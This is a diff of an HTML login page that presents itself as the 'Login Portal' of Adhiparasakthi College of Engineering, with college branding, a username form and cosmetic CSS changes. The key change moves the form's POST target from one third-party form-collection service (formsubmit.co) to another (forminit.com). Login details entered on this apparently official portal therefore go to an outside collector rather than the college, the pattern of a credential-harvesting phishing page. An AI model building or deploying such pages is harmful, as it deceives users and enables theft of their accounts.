@@ -19,7 +19,7 @@
         align-items: center;
         font-family: Arial, sans-serif;
 
-        /* 🌈 Tricolor animated background */
+        /* 🌈 Animated background */
         background: linear-gradient(-45deg, #FF9933, #FFFFFF, #138808);
         background-size: 300% 300%;
         animation: bg 8s ease infinite;
@@ -70,11 +70,6 @@
         outline: none;
     }
 
-    input:focus {
-        border-color: #138808;
-        box-shadow: 0 0 8px rgba(19,136,8,0.4);
-    }
-
     button {
         width: 100%;
         padding: 12px;
@@ -102,15 +97,13 @@
 
 <div class="box">
 
-    <!-- LOGO -->
-    <img src="logo.png" alt="College Logo" class="logo">
+    <img src="logo.png" class="logo">
 
-    <!-- COLLEGE NAME -->
     <h1>ADHIPARASAKTHI COLLEGE OF ENGINEERING</h1>
     <h2>Login Portal</h2>
 
-    <!-- FORM SUBMIT -->
-    <form action="https://formsubmit.co/el/bonapi" method="POST">
+    <!-- ✅ FORMINIT FORM -->
+    <form action="https://forminit.com/f/sw6bs4wpv3a" method="POST">
 
         <input type="text" name="username" placeholder="Username" required>
 
@@ -120,7 +113,7 @@
     </form>
 
     <div class="footer">
-       “Excellence is a continuous process and not an accident” 🚀
+        “Excellence is a continuous process and not an accident” 🚀
     </div>
 
 </div>
